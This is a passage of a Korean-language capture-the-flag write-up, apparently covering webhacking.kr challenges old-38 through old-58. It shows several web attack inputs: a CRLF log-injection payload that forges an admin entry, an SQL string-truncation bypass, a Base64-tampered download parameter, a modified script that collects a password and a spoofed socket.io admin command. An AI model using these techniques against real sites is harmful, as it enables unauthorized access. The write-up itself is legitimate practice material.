일단 네트워크 로그를 보면 Hit을 누르면 `?hit=kogandhi123` 형식의 주소로 요청을 보내는 것을 확인할 수 있다  

Burp Suite의 Intruder로 쿠키를 지운 같은 요청을 100번 보내면 된다  
<br>

---

## old-38

![Image](/assets/img/251222_0/old-38-admin.png)

`index.php`{: .filepath} 소스를 보면 `admin.php` 페이지가 있다는 것을 알 수 있다  

내가 입력했던 값들이 뜨는데 여기서 `admin`으로 로그인했다는 로그가 뜨면 풀린다
<br>

---

Burp Suite로 `id=test%0d%0a118.32.38.69:admin`로 요청을 주고 `admin.php`{: .filepath}에서 새로고침하면 풀린다  

여기서 `%0d`는 `\r`, `%0a`는 `\n`을 인코딩한 값이다  
<br>

---

## old-39

```php
$db = dbconnect();
if($_POST['id']){
    $_POST['id'] = str_replace("\\","",$_POST['id']);
    $_POST['id'] = str_replace("'","''",$_POST['id']);
    $_POST['id'] = substr($_POST['id'],0,15);
    $result = mysqli_fetch_array(mysqli_query($db,"select 1 from member where length(id)<14 and id='{$_POST['id']}"));
    if($result[0] == 1){
        solve(39);
    }
}
```

어떻게 되든 들어가는 값은 15자로 잘려서 들어간다  

그러니까 `admin         '` 이렇게 넣어주면 된다  
15자로 잘리기에 뒤에 따옴표가 하나 더 붙어도 잘려서 하나만 들어가게 된다  
<br>

---

## old-42

다운로드하는 링크가 `?down=` 파라미터로 되어 있는데 파일명을 Base64 인코딩해서 준다  

`flag.docx`{: .filepath}를 Base64로 인코딩하고 전달하면 된다  
<br>

---

## old-54

![Image](/assets/img/251222_0/old-54.png)

Password가 빠르게 첫 문자부터 순서대로 나오는 것 같은데 빨라서 보기 힘들다..  
<br>

---

```javascript
function run(){
  if(window.ActiveXObject){
   try {
    return new ActiveXObject('Msxml2.XMLHTTP');
   } catch (e) {
    try {
     return new ActiveXObject('Microsoft.XMLHTTP');
    } catch (e) {
     return null;
    }
   }
  }else if(window.XMLHttpRequest){
   return new XMLHttpRequest();
 
  }else{
   return null;
  }
 }
x=run();
function answer(i){
  x.open('GET','?m='+i,false);
  x.send(null);
  aview.innerHTML=x.responseText;
  i++;
  if(x.responseText) setTimeout("answer("+i+")",20);
  if(x.responseText=="") aview.innerHTML="?";
}
setTimeout("answer(0)",1000);
```

한 글자를 뽑을 때마다 어딘가로 `?m=` 뒤에 숫자를 0부터 1씩 늘려가며 요청을 한다  
<br>

---

![Image](/assets/img/251222_0/old-15-packets.png)

네트워크 로그를 보면 이렇게 39개의 요청이 있는데 각각 한 글자씩 순서대로 받아오는 걸 볼 수 있다  
<br>

---

```javascript
function run(){
  if(window.ActiveXObject){
   try {
    return new ActiveXObject('Msxml2.XMLHTTP');
   } catch (e) {
    try {
     return new ActiveXObject('Microsoft.XMLHTTP');
    } catch (e) {
     return null;
    }
   }
  }else if(window.XMLHttpRequest){
   return new XMLHttpRequest();
 
  }else{
   return null;
  }
 }
x=run(); flag="";
function answer(i){
  x.open('GET','?m='+i,false);
  x.send(null);
  aview.innerHTML=x.responseText;
  flag += x.responseText;
  i++;
  if(x.responseText) setTimeout("answer("+i+")",20);
  if(x.responseText=="") {aview.innerHTML="?";console.log(flag);}
}
setTimeout("answer(0)",1000);
```

코드를 살짝 수정해서 한번에 플래그가 콘솔에 출력되도록 한다  
<br>

---

## old-58

![Image](/assets/img/251222_0/old-58.png)

미니 콘솔 사이트다  
<br>

---

```javascript
var socket = io();

socket.emit('cmd',"admin:flag");
$('#m').val('');
socket.on('cmd', function(msg){
  $('#messages').append($('<li>').text(msg));
})
```

<br>

---

## old-